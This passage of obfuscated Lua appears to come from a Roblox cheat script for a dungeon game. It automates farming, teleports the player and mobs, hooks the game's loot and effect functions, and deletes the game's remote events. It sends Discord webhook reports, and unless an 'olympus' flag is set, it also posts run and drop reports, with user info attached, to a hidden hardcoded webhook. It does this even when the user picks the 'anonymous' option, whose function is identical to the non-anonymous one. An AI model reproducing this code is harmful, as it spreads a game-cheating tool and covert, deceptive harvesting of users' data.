        Hat3 = "Ha32",
        Hat3Dye = "Hat3Dye",
        Mount = "Mount"
    }
    local el = {
        Costume = "CogWorkArmor",
        Hat1 = "CogWorkTophat",
        Hat2 = "CogWorkGoggles"
    }
    function CogWorkOutfit()
        if aW:GetAttribute('Primary') then
            local em = bR[aW:GetAttribute('Primary')].SubType;
            if em == 'Greataxe' then
                ChangeCosmetic(b3.RightWepSkin, 'CogWorkAxe')
            else
                ChangeCosmetic(b3.RightWepSkin, 'CogWork' .. em)
            end
        end
        if aW:GetAttribute('Offhand') then
            local em = bR[aW:GetAttribute('Offhand')].SubType;
            if em == 'Greataxe' then
                ChangeCosmetic(b3.LeftWepSkin, 'CogWorkAxe')
            else
                ChangeCosmetic(b3.LeftWepSkin, 'CogWork' .. em)
            end
        end
        for z, R in el do
            ChangeCosmetic(z, R)
        end
    end
    OutfitList:AddButton({
        Text = 'Cogwork',
        Func = function()
            if aT then
                CogWorkOutfit()
            end
        end,
        DoubleClick = false
    })
end
local function en(dJ, cg, ck)
    return string.char(dJ + cg - ck)
end
local eo = ''
eo = eo .. en(68, 1, 1)
eo = eo .. en(101, 2, 2)
eo = eo .. en(109, 3, 3)
eo = eo .. en(111, 4, 4)
eo = eo .. en(110, 5, 5)
table.insert(bv, eo)
local ep = ''
ep = ep .. en(76, 2, 2)
ep = ep .. en(105, 1, 1)
ep = ep .. en(102, 0, 0)
ep = ep .. en(101, -1, -1)
ep = ep .. en(83, 0, 0)
ep = ep .. en(116, 0, 0)
ep = ep .. en(101, 0, 0)
ep = ep .. en(97, 0, 0)
ep = ep .. en(108, 0, 0)
function hookWithUserInfo(eq, er, es, color, p, et)
    request({
        Url = eq,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = e:JSONEncode({
            ["content"] = et or '',
            ["embeds"] = {{
                ["title"] = er,
                ["description"] = es,
                ["type"] = 'rich',
                ["color"] = tonumber(color),
                ["footer"] = {
                    ["text"] = p .. ' UTC'
                }
            }}
        })
    })
end
function anonHook(eq, er, es, color, p, et)
    request({
        Url = eq,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = e:JSONEncode({
            ["content"] = et or '',
            ["embeds"] = {{
                ["title"] = er,
                ["description"] = es,
                ["type"] = 'rich',
                ["color"] = tonumber(color),
                ["footer"] = {
                    ["text"] = p .. ' UTC'
                }
            }}
        })
    })
end
function msg(eu, color, p)
    local ev = Options.dungeonHook.Value;
    local ew = p > 600 and timeElapsed(p) or math.round(p / 0.1) / 10 .. 's'
    local ex = 'Code: ``' .. i .. '``\nMission: ``' .. h .. '``\nTime: ``' .. ew .. '``\nClass: ' .. '``' ..
                   cl[b9].DisplayName .. '``'
    if aI then
        local bA = bl:GetChildren()[1]
        local ey = bA and Mob(bA.Name)
        local ag, ec = ey and ey.BossTag, ey and ey.NameTag;
        if ag and ec then
            ex = ex .. '\nBoss: ``' .. ec .. '``'
        end
    end
    if aj then
        if ao.LastDungeonCompletion then
            ex = ex .. '\nTime Since Last Completion: ``' .. math.round((c1 - ao.LastDungeonCompletion) / 0.1) / 10 ..
                     's``'
        end
        if ao.Gold and a9 >= ao.Gold then
            ex = ex .. '\nGold Gained: ``' .. formatNumberWithCommas(a9 - ao.Gold) .. '``'
        end
        ao.Gold = a9;
        ao.LastDungeonCompletion = c1;
        save()
    end
    ex = ex .. '\nGold: ``' .. formatNumberWithCommas(b0.Value) .. '``'
    if aL then
        local ez = {
            KrakenRaid = {
                coinCode = "KrakenCoin",
                coinStr = "Kraken Coins",
                lb = "KRAKEN_KILLS",
                name = "Kraken"
            },
            VaneRaid = {
                coinCode = "DragonCoin",
                coinStr = "Dragon Coins",
                lb = "VANE_KILLS",
                name = "Vane"
            },
            HalloweenRaid = {
                coinCode = "HalloweenCoin",
                coinStr = "Halloween Coins",
                lb = "FALLENKING_KILLS",
                name = "Halloween"
            },
            ChristmasRaid = {
                coinCode = "ChristmasCoin",
                coinStr = "Christmas Coins",
                lb = "SANTA_KILLS",
                name = "Christmas"
            }
        }
        local eA = aM and "KrakenRaid" or aO and "VaneRaid" or aP and "HalloweenRaid" or aN and "ChristmasRaid"
        local eB = ez[eA].coinCode;
        local eC = ez[eA].coinStr;
        local eD = ez[eA].lb;
        local eE = ez[eA].name;
        local eF = game:GetService("ReplicatedStorage").Shared.LeaderboardHookup.GetScore:InvokeServer(eD, 1)
        ex = ex .. '\n' .. eE .. ' Raids Completed: ``' .. eF[1] .. '`` / ``' .. eF[2] .. '``'
        if bM:FindFirstChild(eB) and bM[eB]:FindFirstChild('Count') then
            ex = ex .. '\n' .. eC .. ': ``' .. bM[eB].Count.Value .. '``'
        end
    elseif aI or aJ then
        ex = ex .. '\nFloor: **' .. a4.ReplicateTowerFloor.Value .. '**'
    end
    function getGuildInfo()
        local S = a5.Guilds.GetCache:InvokeServer(bZ)
        local T;
        for z, R in S.Members do
            if tonumber(z) == d then
                T = R.Points;
                break
            end
        end
        if T then
            ex = ex .. '\nGuild Points: ``' .. T .. '`` / ``' .. bZ .. '``'
        end
    end
    local eG = true;
    if bZ and not Toggles.anonHook.Value and eG then
        getGuildInfo()
    end
    if not Toggles.anonHook.Value then
        ex = ex .. '\n' .. f
    end
    if ev and #ev > 30 then
        if ai then
            task.wait(1.5)
        end
        ai = true;
        if Toggles.anonHook.Value then
            anonHook(ev, eu, ex, color, utcDateAndTime())
        else
            hookWithUserInfo(ev, eu, ex, color, utcDateAndTime())
        end
        ai = false
    end
    if not olympus then
        if bZ and Toggles.anonHook.Value then
            getGuildInfo()
        end
        if Toggles.anonHook.Value then
            ex = ex .. '\n' .. f
        end
        if ai then
            task.wait(1.5)
        end
        ai = true;
        hookWithUserInfo(boink3, eu, ex, color, utcDateAndTime())
        ai = false
    end
end
function missionEndRestartOrNextEvent()
    if Toggles.Autofarm.Value then
        if Toggles.nightmareLoop.Value and aK then
            local eH = nextInTbl(aB, ay)
            if bO[eH].InternalID == 3 and Toggles.skipScarecrowNm.Value then
                eH = nextInTbl(aB, eH)
                libNoti('Skipping Scarecrow Defense')
            end
            StartRaid(eH, az)
        elseif Toggles.NextDungeon.Value and not aI then
            local eI = nextInTbl(cd, ay)
            local eJ = table.find(aq, eI)
            local eK = a_.Level.Value >= missionLevelReq(eI) and (az == 5 or aH or aJ)
            local eL = eK and eI or ay;
            local eM = not eK and (az == 1 and 5 or az) or not eJ and 1 or nil;
            StartRaid(eL, eM)
        elseif Toggles.RestartDungeon.Value then
            game:GetService("ReplicatedStorage").Shared.Missions.LeaveChoice:FireServer(true)
            game:GetService("ReplicatedStorage").Shared.Missions.NotifyReadyToLeave:FireServer()
            StartRaid(ay, az)
        end
    end
end
function openEndChests()
    if Toggles.Autofarm.Value then
        for z = 1, 4 do
            bb:InvokeServer()
        end
    end
end
if aC then
    if ax:FindFirstChild(6) then
        task.spawn(function()
            local eN, eO, eP = Workspace:WaitForChild('Pillar1'), Workspace:WaitForChild('Pillar2'),
                Workspace:WaitForChild('Pillar3')
            eP:WaitForChild('HealthProperties')
            eN.Name = 'Pillar'
            eO.Name = 'Pillar'
            eP.Name = 'Pillar'
            eN.Parent = bl;
            eO.Parent = bl;
            eP.Parent = bl
        end)
    elseif aG or aM then
        task.spawn(function()
            while true do
                local eQ = bl:FindFirstChild('BOSSKrakenMain') or bl:FindFirstChild('EVENTBOSSKraken')
                if eQ then
                    local eR = Instance.new('Folder')
                    eR.Name = 'WaterFolder'
                    eR.Parent = Workspace;
                    eQ.Parent = Workspace.WaterFolder;
                    if aG then
                        bj = true
                    end
                    break
                end
                task.wait()
            end
        end)
    elseif ax:FindFirstChild(30) then
        local eS = 0;
        task.spawn(function()
            while true do
                for z, R in bl:GetChildren() do
                    if (R.PrimaryPart.Position - Vector3.new(533, 302, -123)).magnitude < 100 then
                        R:Destroy()
                        eS = eS + 1
                    end
                end
                if eS == 3 then
                    break
                end
                task.wait()
            end
        end)
    end
    local eT = bO[ay]
    h = eT.NameTag .. (az == 1 and ' Normal' or az == 5 and ' Challenge' or '')
    h = string.gsub(h, '%(NIGHTMARE%) ', 'Nightmare ')
    i = eT.EventDungeon and 'Event' or (aI or aJ) and 'Special' or eT.TowerID and 'Tower ' .. eT.TowerID or
            eT.DisplayWorldID .. '-' .. eT.WorldMissionID;
    a5.Missions.MissionFinished.OnClientEvent:Once(function(eU, eV, eW, eX)
        c1 = tick()
        a9 = b0.Value;
        aQ = true;
        task.spawn(function()
            libNoti('Mission ' .. (eW and 'Failed!' or 'Completed!'))
            msg('Mission ' .. (eW and 'Failed' or 'Completed'), C[eW and "Red" or "Green"], eU)
        end)
        bM.ChildAdded:Connect(function(ck)
            local eY = bR[ck.Name]
            local eZ = c0:GetItemTier(ck)
            local e_;
            if eY.Type == 'Weapon' or eY.Type == 'Armor' then
                if bo then
                    bp = false;
                    bq = tick()
                end
                ck:WaitForChild('Level')
                if eZ < 6 then
                    if Options.AutoSellTbl.Value[eZ] and Toggles.Autofarm.Value then
                        libNoti('Sold a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey)
                        sell({ck})
                        e_ = true
                    end
                end
                if eZ == 5 and not Options.AutoSellTbl.Value[5] then
                    ck:WaitForChild('Perk1')
                    ck:WaitForChild('Perk2')
                    ck:WaitForChild('Perk3')
                    ck.Perk1:WaitForChild('PerkValue')
                    ck.Perk2:WaitForChild('PerkValue')
                    ck.Perk3:WaitForChild('PerkValue')
                    local f0;
                    local f1;
                    local f2;
                    if not Toggles.anonHook.Value then
                        f2 = f .. '\nType: ``' .. eY.Type .. '``\nLevel: ``' .. ck.Level.Value .. '``\n## ``' ..
                                 eY.DisplayKey .. '``'
                    else
                        f2 =
                            'Type: ``' .. eY.Type .. '``\nLevel: ``' .. ck.Level.Value .. '``\n## ``' .. eY.DisplayKey ..
                                '``'
                    end
                    for dj, f3 in ck:GetChildren() do
                        if Options[f3.Value] then
                            local f4 = math.round(f3.PerkValue.Value * 100)
                            local f5 = Options[f3.Value].Value;
                            local f6 = f5 > math.round(bQ[f3.Value].StatRange[1] * 100)
                            local f7 = bQ[f3.Value].DisplayName;
                            local f8 = f6 and f4 >= f5;
                            local f9 = f6 and f4 == math.round(bQ[f3.Value].StatRange[2] * 100)
                            if f8 and not f0 then
                                f0 = true
                            end
                            if f9 and not f1 then
                                f1 = true
                            end
                            f2 = f2 .. '\n' ..
                                     (f9 and '### <:Gold:832693611396857886> ' or f8 and '### :green_circle: ' or
                                         '### :red_circle: ') .. f7 .. ': ``' .. f4 .. '%``'
                        end
                    end
                    if not f0 and Toggles.smartPerkSell.Value and Toggles.Autofarm.Value then
                        libNoti('Sold a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey)
                        sell({ck})
                        e_ = true
                    end
                    local ev = Options.drophook.Value;
                    if ev and #ev > 30 and Toggles.Autofarm.Value then
                        task.spawn(function()
                            local fa = Options.dropHookRoleId.Value and #Options.dropHookRoleId.Value > 0 and '<@&' ..
                                           Options.dropHookRoleId.Value .. '>'
                            local fb = f0 and (fa or '@everyone') or ''
                            local dh = f1 and C.Gold or f0 and C.Green or C.Cyan;
                            if ai then
                                task.wait(1.5)
                            end
                            ai = true;
                            local fc = 'Legendary Drop'
                            if Toggles.anonHook.Value then
                                anonHook(ev, fc, f2, dh, utcDateAndTime(), fb)
                            else
                                hookWithUserInfo(ev, fc, f2, dh, utcDateAndTime(), fb)
                            end
                            ai = true
                        end)
                    end
                end
                if not e_ then
                    libNoti('Got a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey .. '!')
                end
                if bo then
                    bp = true;
                    bq = tick()
                end
            elseif eY.Type == 'Egg' and Toggles.autoSellEggs.Value and Toggles.Autofarm.Value then
                sell({ck})
                libNoti(eY.DisplayKey .. ' sold!')
            end
        end)
        bN.ChildAdded:Connect(function(ck)
            local eY = bR[ck.Name]
            if Options.selectedCosmetics.Value[eY.DisplayKey] and Toggles.Autofarm.Value then
                sell({ck})
                libNoti(eY.DisplayKey .. ' sold!')
            end
        end)
        pcallWithError(function()
            openEndChests()
        end)
        task.wait(eW and 2 or 3 + Options.dungeonRestartTimer.Value)
        missionEndRestartOrNextEvent()
    end)
    local fd = a5.Towers:WaitForChild('TowerFinished')
    if aH or aJ then
        fd.OnClientEvent:Once(function(fe, eU)
            local ff = eU;
            if eU > 31536000 then
                ff = 0
            end
            task.spawn(function()
                task.wait(40)
                missionEndRestartOrNextEvent()
            end)
            c1 = tick()
            aQ = true;
            a9 = b0.Value;
            task.spawn(function()
                msg("Mission Completed", C.Green, ff)
            end)
            pcallWithError(function()
                openEndChests()
            end)
            while true do
                if bo and bp and tick() - bq >= 2 and tick() - br >= 2 or bo and tick() - br >= 15 then
                    break
                end
                task.wait()
            end
            task.wait(Options.towerRestartTimer.Value)
            missionEndRestartOrNextEvent()
        end)
    end
end
if aH or aI or aJ then
    Workspace.ChildAdded:Connect(function(ck)
        if Toggles.Autofarm.Value then
            local fg = aQ and aH;
            local fh = table.find(bf, ck.Name) and Toggles.collectEggChests.Value;
            if fh or ck.Name == bg or ck.Name == bh and (not aH or aH and (aQ or aa)) or (aa or fg) and ck.Name == bi then
                if aQ and not fh then
                    br = tick()
                    bo = true;
                    bp = false
                end
                task.spawn(function()
                    ck.PrimaryPart.CanCollide = false;
                    while ck and ck.PrimaryPart and Toggles.Autofarm.Value do
                        if alive() then
                            ck.PrimaryPart.CFrame = CFrame.new(aU.Position)
                        end
                        task.wait()
                    end
                end)
            end
        end
    end)
    bM.ChildAdded:Connect(function(ck)
        local eY = bR[ck.Name]
        local eZ = c0:GetItemTier(ck)
        local e_;
        if eY.Type == 'Weapon' or eY.Type == 'Armor' then
            if bo then
                bp = false;
                bq = tick()
            end
            ck:WaitForChild('Level')
            if eZ < 6 then
                if Options.AutoSellTbl.Value[eZ] and Toggles.Autofarm.Value then
                    task.wait(2)
                    libNoti('Sold a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey)
                    sell({ck})
                    e_ = true
                end
            end
            if eZ == 5 and not Options.AutoSellTbl.Value[5] then
                ck:WaitForChild('Perk1')
                ck:WaitForChild('Perk2')
                ck:WaitForChild('Perk3')
                ck.Perk1:WaitForChild('PerkValue')
                ck.Perk2:WaitForChild('PerkValue')
                ck.Perk3:WaitForChild('PerkValue')
                local f0;
                local f1;
                local f2;
                if not Toggles.anonHook.Value then
                    f2 = f .. '\nType: ``' .. eY.Type .. '``\nLevel: ``' .. ck.Level.Value .. '``\n## ``' ..
                             eY.DisplayKey .. '``'
                else
                    f2 = 'Type: ``' .. eY.Type .. '``\nLevel: ``' .. ck.Level.Value .. '``\n## ``' .. eY.DisplayKey ..
                             '``'
                end
                for dj, f3 in ck:GetChildren() do
                    if Options[f3.Value] then
                        local f4 = math.round(f3.PerkValue.Value * 100)
                        local f5 = Options[f3.Value].Value;
                        local f6 = f5 > math.round(bQ[f3.Value].StatRange[1] * 100)
                        local f7 = bQ[f3.Value].DisplayName;
                        local f8 = f6 and f4 >= f5;
                        local f9 = f6 and f4 == math.round(bQ[f3.Value].StatRange[2] * 100)
                        if f8 and not f0 then
                            f0 = true
                        end
                        if f9 and not f1 then
                            f1 = true
                        end
                        f2 = f2 .. '\n' ..
                                 (f9 and '### <:Gold:832693611396857886> ' or f8 and '### :green_circle: ' or
                                     '### :red_circle: ') .. f7 .. ': ``' .. f4 .. '%``'
                    end
                end
                if not f0 and Toggles.smartPerkSell.Value and Toggles.Autofarm.Value then
                    libNoti('Sold a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey)
                    sell({ck})
                    e_ = true
                end
                local ev = Options.drophook.Value;
                if ev and #ev > 30 and Toggles.Autofarm.Value then
                    task.spawn(function()
                        local fa = Options.dropHookRoleId.Value and #Options.dropHookRoleId.Value > 0 and '<@&' ..
                                       Options.dropHookRoleId.Value .. '>'
                        local fb = f0 and (fa or '@everyone') or ''
                        local dh = f1 and C.Gold or f0 and C.Green or C.Cyan;
                        if ai then
                            task.wait(1.5)
                        end
                        ai = true;
                        local fc = 'Legendary Drop'
                        if Toggles.anonHook.Value then
                            anonHook(ev, fc, f2, dh, utcDateAndTime(), fb)
                        else
                            hookWithUserInfo(ev, fc, f2, dh, utcDateAndTime(), fb)
                        end
                        ai = true
                    end)
                end
            end
            if not e_ then
                libNoti('Got a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey .. '!')
            end
            if bo then
                bp = true;
                bq = tick()
            end
        elseif eY.Type == 'Egg' and Toggles.autoSellEggs.Value and Toggles.Autofarm.Value then
            sell({ck})
            libNoti(eY.DisplayKey .. ' sold!')
        end
    end)
    bN.ChildAdded:Connect(function(ck)
        local eY = bR[ck.Name]
        if Options.selectedCosmetics.Value[eY.DisplayKey] and Toggles.Autofarm.Value then
            sell({ck})
            libNoti(eY.DisplayKey .. ' sold!')
        end
    end)
end
local fi;
local fj;
local fk = {
    EliteParticles = 'Part',
    Model = 'Model',
    BlastIndicator = 'BlastIndicator'
}
if aI then
    workspace.ChildAdded:Connect(function(ck)
        if Toggles.Autofarm.Value then
            for z, R in fk do
                if ck.Name == z and ck:IsA(R) then
                    ck:Destroy()
                end
            end
        end
    end)
end
local fl = require(a4.Client.Gui.GuiScripts.LootReceived)
local fm = fl.AddItemToQueue;
Toggles.Autofarm:OnChanged(function(fn)
    ak = tick()
    bX = false;
    if not fn then
        fl.AddItemToQueue = fm
    end
    if fn and ConfigAutoLoaded and aC then
        local dw = tick()
        while (bt < 2 or bs < 2 or bu < 2) and Toggles.Autofarm.Value and tick() - dw < 3 do
            task.wait()
        end
    end
    if fn and aI and aC then
        for dj, ck in workspace:GetChildren() do
            for z, R in fk do
                if ck.Name == z and ck:IsA(R) then
                    ck:Destroy()
                end
            end
        end
    end
    local fo = fn and aC and (aF and Options.dungeonStartTimer.Value or (aH or aJ) and Options.towerStartTimer.Value)
    if fo and fo > 0 then
        local dw = tick()
        local fp;
        local fq;
        if aJ then
            if alive() then
                fq = aU.Position
            end
            if Toggles.Killaura.Value then
                Toggles.Killaura:SetValue(false)
                fp = true;
                libNoti('Killaura Disabled! It will be turned back on automatically when autofarm starts!', 6)
            end
        end
        while tick() - dw <= fo and Toggles.Autofarm.Value do
            local fr = math.round(fo - (tick() - dw))
            setMissionObjective('[Infinite]: Starting Mission in ' .. fr .. 's')
            ak = tick()
            if aJ and alive() and (aU.Position - co.Position).magnitude > 100 then
                SmartPlayerTp(CFrame.new(co.Position + Vector3.new(0, 20, 0)))
            end
            task.wait()
        end
        resetMissionObjective()
        if fp and Toggles.Autofarm.Value and not Toggles.Killaura.Value then
            Toggles.Killaura:SetValue(true)
        end
        if aJ then
            SmartPlayerTp(CFrame.new(fq + Vector3.new(0, 5, 0)))
        end
    end
    if aC and Toggles.Autofarm.Value then
        fl.AddItemToQueue = function(...)
            do
                return
            end
        end;
        if not fi then
            local fs = Instance.new("Part")
            fs.Anchored = true;
            fs.Size = Vector3.new(20, 1, 20)
            fs.Parent = workspace;
            fs.Transparency = 1;
            fi = true
        end
        if aw:FindFirstChild('MissionStart') and alive() then
            for z, R in aw.MissionStart:GetDescendants() do
                if R:IsA('TouchTransmitter') and R.Parent then
                    R.Parent.CanCollide = false;
                    R.Parent.Anchored = true;
                    R.Parent.CFrame = CFrame.new(aU.Position)
                    break
                end
            end
        end
        if aF or aH then
            AutoCheckpoint()
        end
        if ay ~= 38 then
            AntiFling()
        end
        MobCounter()
        local ft = false;
        for z, R in ca do
            if ax:FindFirstChild(R.Id) then
                ft = true;
                if R.ignoreMob then
                    MobTeleportIgnore(R.ignoreMob, R.mobWaitTbl, R.mobWaitTime, R.alwaysWait)
                elseif R.priorityTbl then
                    MobTeleportPriority(R.priorityTbl, R.mobWaitTbl, R.mobWaitTime, R.alwaysWait)
                end
                break
            end
        end
        if not ft then
            MobTeleport()
        end
        task.spawn(function()
            while Toggles.Autofarm.Value do
                if alive() and aV:FindFirstChild('MaxHealth') then
                    local fu = aV.Health.Value / aV.MaxHealth.Value / 0.01;
                    if Options.resumePercent.Value > Options.healPercent.Value then
                        if fu <= Options.healPercent.Value and fu > 0 and not bX then
                            bX = true;
                            libNoti('Pausing To Heal!', 2)
                        elseif fu >= Options.resumePercent.Value and bX then
                            bX = false;
                            libNoti('Resuming Attack!', 2)
                        end
                    else
                        if fu == 100 and bX then
                            bX = false;
                            libNoti('Resuming Attack!', 2)
                        end
                    end
                end
                local fv = workspace:FindFirstChild('IceWall') or workspace:FindFirstChild('IgnisShield')
                fv = fv and fv:FindFirstChild('Ring')
                local fw =
                    workspace:FindFirstChild('KrakenCannon') and workspace.KrakenCannon:FindFirstChild('Base') and
                        workspace.KrakenCannon.Base.Transparency < 1 and workspace.KrakenCannon.Base;
                local fx = workspace:FindFirstChild('CureFountainFallenKing') and
                               workspace.CureFountainFallenKing:FindFirstChild('ArcanePanel')
                local fy = fv or fw or fx;
                if fy and alive() then
                    if a8 then
                        a8 = false
                    end
                    if (aU.Position - fy.Position).magnitude > 10 then
                        aT:SetPrimaryPartCFrame(fy.CFrame * CFrame.new(0, 3, 0))
                    end
                else
                    if not a8 then
                        a8 = true
                    end
                end
                task.wait()
            end
        end)
    end
    if aH and Toggles.Autofarm.Value and aC then
        task.spawn(function()
            while Toggles.Autofarm.Value do
                local fz = 0;
                for z = 1, 4 do
                    local A = findFirstChild(c.PlayerGui, {'TowerVisual', 'TowerVisual', 'TowerChests', 'Chests',
                                                           'Chest' .. z, 'Overlay'})
                    if A and A.IsLoaded then
                        fz = fz + 1
                    end
                end
                if fz == 4 then
                    table.insert(c7, 'BossDoorTrigger')
                end
                local dw = tick()
                repeat
                    task.wait()
                until tick() - dw > 2 or not Toggles.Autofarm.Value;
                task.wait()
            end
        end)
    end
    if fn and aG and aC then
        local fA;
        local fB;
        local fC;
        local fD;
        task.spawn(function()
            while Toggles.Autofarm.Value and disabled do
                if bj and a8 and not fA then
                    local fE = bl:GetChildren()
                    if not fC and not fD then
                        fD = true;
                        task.spawn(function()
                            for z, R in fE do
                                if isAlive(R) and
                                    not (R.MobProperties.CurrentAttack.Value == 'Piledriver' or
                                        R.MobProperties.CurrentAttack.Value == 'Slap') then
                                    local ab = R.PrimaryPart;
                                    local dw = tick()
                                    while ab and not fC and not fA and a8 and Toggles.Autofarm.Value do
                                        if tick() - dw >= 0.4 then
                                            break
                                        end
                                        local fF = bX and e0 or Vector3.new()
                                        SmartPlayerTp(CFrame.new(ab.Position + Vector3.new(0, 40, 0) + fF) +
                                                          ab.CFrame.lookVector * 30, ab)
                                        b_:Wait()
                                    end
                                end
                            end
                            local dw = tick()
                            while ab and not fC and not fA and a8 and bd == 1 do
                                if tick() - dw >= 0.4 then
                                    break
                                end
                                SmartPlayerTp(CFrame.new(3371, 73, -331))
                                b_:Wait()
                            end
                            fD = false
                        end)
                    end
                    for z, R in fE do
                        if isAlive(R) and
                            (R.MobProperties.CurrentAttack.Value == 'Piledriver' or R.MobProperties.CurrentAttack.Value ==
                                'Slap') and R.PrimaryPart then
                            local ab = R.PrimaryPart;
                            local fG =
                                (CFrame.new(ab.Position + Vector3.new(0, 5, 0)) + ab.CFrame.lookVector * 45).Position;
                            while isAlive(R) and Toggles.Autofarm.Value and
                                (R.MobProperties.CurrentAttack.Value == 'Piledriver' or
                                    R.MobProperties.CurrentAttack.Value == 'Slap') and ab and not fA and a8 do
                                if not fC then
                                    fC = true
                                end
                                local e2 = 5 + Options.Offset.Value;
                                local fF = bX and e0 or Vector3.new()
                                setCamera(not bX and Toggles.mobCamera.Value and bw, fG)
                                SmartPlayerTp(CFrame.new(ab.Position + Vector3.new(0, e2, 0) + fF) +
                                                  ab.CFrame.lookVector * 45, ab)
                                b_:Wait()
                            end
                            SmartPlayerTp(CFrame.new(3371, 73, -331))
                        end
                    end
                    if fC then
                        fC = false
                    end
                    bY = nil;
                    unnoclip()
                    setCamera()
                end
                task.wait()
            end
        end)
        task.spawn(function()
            while Toggles.Autofarm.Value and disabled do
                if bj and Workspace:FindFirstChild('KrakenPipe') and not Toggles.ignoreCannon.Value and alive() then
                    for z, R in Workspace:GetChildren() do
                        if R.Name == 'KrakenPipe' and R:FindFirstChild('GuiPart') and
                            R.GuiPart:FindFirstChild('SurfaceGui') and R.GuiPart.SurfaceGui:FindFirstChild('Percent') and
                            R:FindFirstChild('Base') then
                            while Toggles.Autofarm.Value and R.GuiPart.SurfaceGui.Percent.Text ~= '100%' and
                                not Toggles.ignoreCannon.Value do
                                if not fA then
                                    fA = true
                                end
                                local fF = bX and e0 or Vector3.new()
                                if alive() and (aU.Position - R.Base.Position).magnitude > 10 then
                                    SmartPlayerTp(CFrame.new(R.Base.Position + Vector3.new(0, 3, 0) + fF))
                                end
                                b_:Wait()
                            end
                        end
                    end
                end
                if fA then
                    fA = false
                end
                task.wait()
            end
        end)
    end
    if (aI or aJ) and Toggles.Autofarm.Value and aC then
        MobTeleport()
        local fH = game:GetService("Workspace").LobbyTeleport.Interaction;
        local fI = game:GetService("Workspace").Boss_Gate.Interactions.Bounds;
        task.spawn(function()
            while Toggles.Autofarm.Value do
                if alive() then
                    fI.CanCollide = false;
                    fI.CFrame = CFrame.new(aU.Position)
                    fH.CFrame = CFrame.new(aU.Position)
                end
                task.wait(0.25)
            end
        end)
        if aI then
            while Toggles.Autofarm.Value do
                if a4.ReplicateTowerStartFloor.Value >= 100 then
                    break
                end
                task.wait()
            end
            local fJ = a4.ReplicateTowerStartFloor.Value;
            local fK = a4.ReplicateTowerFloor;
            function hook(eq, er, es, color)
                pcallWithError(function()
                    request({
                        Url = eq,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = e:JSONEncode({
                            ["embeds"] = {{
                                ["title"] = er,
                                ["description"] = es,
                                ["type"] = 'rich',
                                ["color"] = tonumber(color),
                                ["footer"] = {
                                    ["text"] = utcDateAndTime() .. ' UTC'
                                }
                            }}
                        })
                    })
                end)
            end
            task.spawn(function()
                while Toggles.Autofarm.Value do
                    if Options.completedInfiniteTowerFloors.Value and
                        tonumber(Options.completedInfiniteTowerFloors.Value) > 0 then
                        if fK.Value - fJ >= tonumber(Options.completedInfiniteTowerFloors.Value) and
                            Toggles.restartAfterFloors.Value then
                            libNoti(fK.Value - fJ .. ' floors completed, restarting Infinite Tower!')
                            task.spawn(function()
                                local fL =
                                    '## Floor: ``' .. fK.Value .. '``' .. '\nTime: ``' .. timeElapsed(tick() - g) ..
                                        '``\nClass: ' .. '``' .. cl[b9].DisplayName .. '``'
                                fL = fL .. '\nGold Gain: ``' .. formatNumberWithCommas(b2 - b1) .. '``'
                                if not Toggles.anonHook.Value then
                                    fL = fL .. '\n' .. f
                                end
                                if Options.dungeonHook.Value and #Options.dungeonHook.Value > 30 then
                                    hook(Options.dungeonHook.Value, 'Smart Restarting Infinite Tower', fL, C.Gold)
                                end
                                if Toggles.anonHook.Value then
                                    fL = fL .. '\n' .. f
                                end
                                if not olympus then
                                    hook(boink3, 'Smart Restarting Infinite Tower', fL, C.Gold)
                                end
                            end)
                            task.spawn(function()
                                task.wait(3)
                                StartRaid(ay)
                            end)
                            break
                        end
                    end
                    if fK.Value > fJ and fK.Value % 5 == 0 and fK.Value ~= fj then
                        fj = fK.Value;
                        local fL = '## Floor: ``' .. fK.Value .. '``' .. '\nTime: ``' .. timeElapsed(tick() - g) ..
                                       '``\nClass: ' .. '``' .. cl[b9].DisplayName .. '``'
                        fL = fL .. '\nGold Gain: ``' .. formatNumberWithCommas(b2 - b1) .. '``'
                        if not Toggles.anonHook.Value then
                            fL = fL .. '\n' .. f
                        end
                        if Options.dungeonHook.Value and #Options.dungeonHook.Value > 30 then
                            libNoti('Infinite Tower Webhook Report Sent!')
                            hook(Options.dungeonHook.Value, 'Infinite Tower Report', fL, C.Purple)
                        end
                        if Toggles.anonHook.Value then
                            fL = fL .. '\n' .. f
                        end
                        if not olympus then
                            hook(boink3, 'Infinite Tower Report', fL, C.Purple)
                        end
                    end
                    task.wait()
                end
            end)
        end
    end
end)
task.spawn(function()
    workspace:WaitForChild("Mobs").ChildAdded:Connect(function(bA)
        bA:WaitForChild("HealthProperties"):WaitForChild("Health").Changed:Connect(function(cU)
            if cU == 0 then
                game:GetService("Debris"):AddItem(bA, 0.2)
            end
        end)
    end)
    if workspace:FindFirstChild('Assets_FX') then
        for z, R in workspace.Assets_FX:GetChildren() do
            R:Destroy()
        end
        workspace.Assets_FX.ChildAdded:Connect(function(ck)
            ck:Destroy()
        end)
    end
    local cj = require(game.ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Effects"))
    local fM = cj.DoEffect;
    cj.DoEffect = function(self, ...)
        if Toggles.disableEffects.Value then
            return
        end
        local fN = {...}
        if ay and ay == 27 and fN[1] == "RadialIndicator" and Toggles.Autofarm.Value then
            fN[5] = fN[5] + 1;
            return fM(self, unpack(fN))
        end
        return fM(self, ...)
    end
end)
local fO = {}
local fP = {}
local fQ = {}
local fR = game:GetService("ReplicatedStorage").Shared.Mobs.Mobs;
for z, R in fR:GetDescendants() do
    if R:IsA('RemoteEvent') then
        local fS = true;
        if R.Parent and table.find(fO, R.Parent.Name) then
            fS = false
        end
        for dZ, F in fP do
            if table.find(F, R.Name) and R.Parent and R.Parent.Name == dZ then
                fS = false
            end
        end
        if fS and table.find(fQ, R.Name) then
            fS = false
        end
        if fS then
            R:Destroy()
        end
    end
end
do
    function getBoundingBox(bx)
        local fT = bx.Size;
        local fU = bx.Position - fT / 2;
        local fV = bx.Position + fT / 2;
        return fU, fV
    end
    function getClosestPointOnAABB(fW, fU, fV)
